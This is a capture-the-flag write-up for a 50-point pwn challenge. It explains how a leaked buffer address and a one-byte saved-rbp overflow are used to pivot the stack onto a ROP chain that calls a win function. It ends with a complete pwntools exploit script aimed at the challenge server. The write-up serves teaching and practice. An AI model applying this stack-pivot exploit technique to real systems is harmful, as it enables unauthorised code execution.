## Maintenance Log - PWN
* Author&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: CSSCTF
* Point&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: 50
* Difficulity&nbsp;&nbsp;&nbsp;: Unknown
---

#### Description
*Our diagnostics terminal logged an anomaly during maintenance. The vendor insists their service is fortified with stack canaries and safe from memory corruption, but the interface IS LEAKING.*<br>
<br>
*Can you forge a maintenance report, bypass the perimeter, and acquire administrative clearance?*<br>
<br>

#### Analysis
At first, I check for the file protection.<br>
<br>
<img width="812" height="167" alt="image" src="https://github.com/user-attachments/assets/745b78c0-735c-43a1-975d-8579840a8e8b" /><br>
<br>
From the result, the file only have `Stack Canary` and `NX` is enabled, it mean we can't do overflow in certain stack frame nor execute code in the stack.<br>
After checked the file protection, I analyzed the file using `Ghidra`, since the file was `stripped`.<br>
<br>
<img width="665" height="341" alt="image" src="https://github.com/user-attachments/assets/0d8c7bd7-6215-4aef-8529-331c5d1ed8b0" /><br>
<br>
From the photo, we can see that the program ask for our input and there is something interesting that it reveal the buffer address. Maybe we can use it later, let's check for the `FUN_00401348()` function.<br>
<br>
<img width="478" height="233" alt="image" src="https://github.com/user-attachments/assets/1cd00f69-0c95-48f8-8b3e-3c47b227d1ec" /><br>
<br>
From the screenshot, I get second input and in here I realize that the input give me one-byte-off overflow and now I wonder how to take an advantage of it? And also this function has no `stack canaries` protection, so I can overflow it although only one byte<br>
And I also found, let's say `win` address since it gives me the flag, a function that give me a flag.<br>
<br>
<img width="637" height="637" alt="image" src="https://github.com/user-attachments/assets/988967a5-99d4-4998-876d-5ef9d4cb92da" /><br>
<br>
The function need an argument, first argumen is `0xdeadbeef` and second parameter is `0xcafebabe`.<br>
I think it's already clear, our goal is to control the execution flow and turn it into `win` function, the last problem is **how?**. As we know, I only have these things.<br>

* buffer address leak<br>
* one-byte-off overflow<br>

After some research and inspiration, I decide to use `stack pivoting` method, in short I will deceive `rsp` register to hold address that I want. How to do that<br>
Okey, first, let's take a look at `buffer address` reveal.<br>
<br>
<img width="950" height="101" alt="image" src="https://github.com/user-attachments/assets/e6dec850-60f7-4838-aa54-d6be4a248e3b" />
<br>
As we can see, the `buffer address` is `0x7fffffffdbe0` and keep it in mind.<br>
Now, let's check for the buffer where our second input is stored, the one who has one-byte-off overflow vulnerability.<br>
<br>
<img width="841" height="125" alt="image" src="https://github.com/user-attachments/assets/ce4f4963-4c58-458f-a6af-a55084796418" /><br>
<br>
Okey, from the photo, that was `read()` function that will take care of our second input and stored in `0x7fffffffdbb0`, wait...Do you see something interesting?<br>

* `first input address (buffer address leak)`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= `0x7fffffffdbe0`
* `second input address (one-byte-off overflow vulnerability)`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;= `0x7fffffffdbb0`

Yes..Exactly, their LSB or the lowest byte are the only different, the rest is same, so is it good news? OF COURSE<br>
Okey, lemme tell you why that is good news, input function, `read(), scanf(), fgets(), etc` will put their first byte on LSB, since the difference of two address stack we just talked is only LSB and we have one-byte-off overflow, so we can change the LSB of address that `rbp` register right now hold.<br>
We can change it into our address, so `rsp` will hold our address that's full of `ROPchain`.

#### Exploit
Because we already know the flow, we just need to build our payload.<br>
<br>
```python
from pwn import *

elf = context.binary = ELF('./chall')
#p = process('./chall')
p = remote('34.116.80.78', 7312)
rop = ROP(elf)

rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
win_add = 0x0401268

p.recvuntil(b'[*] Report buffer allocated at: ')
leak = p.recvline().strip()
real_leak = int(leak, 16)
log.success(f'leak: {leak}')
log.success(f'real leak: {hex(real_leak)}')
payload = flat(
   #exploit goes here
)


leak_8 = real_leak + 8
log.success(f'leak_8: {hex(leak_8)}')
payload_1 = p64(real_leak)
payload_1 += p64(ret)
payload_1 += p64(rdi)
payload_1 += p64(0xdeadbeef)
payload_1 += p64(rsi)
payload_1 += p64(0xcafebabe)
payload_1 += p64(win_add)

offset = 32
one_byte_off = real_leak & 0xff
pde = p8(one_byte_off)
log.success(f'LSB:{hex(one_byte_off)}')
log.success(f'P8 : {(pde)}')
payload_2 = b'a' * offset
payload_2 += p8(one_byte_off)

p.sendlineafter(b'Enter report summary: ', payload_1)
p.sendlineafter(b'Tagging operator: ', payload_2)

p.interactive()
```
<br>
That's my full payload
